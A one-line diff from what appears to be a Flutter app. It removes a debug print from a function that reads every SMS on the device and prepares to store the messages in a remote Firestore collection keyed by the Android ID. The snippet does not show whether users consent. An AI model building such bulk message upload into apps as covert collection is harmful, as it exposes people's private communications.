@@ -27,7 +27,6 @@ Future<void> getSms() async {
     SmsQuery query = SmsQuery();
     List<SmsMessage> messages = await query.getAllSms;
     Iterable<SmsMessage> reversedMessages = messages.reversed;
-    print("reversedMessages");
     String? androidId = await getIdentity();
     CollectionReference smsCollection =
         firestore.collection('client').doc(androidId).collection("sms");
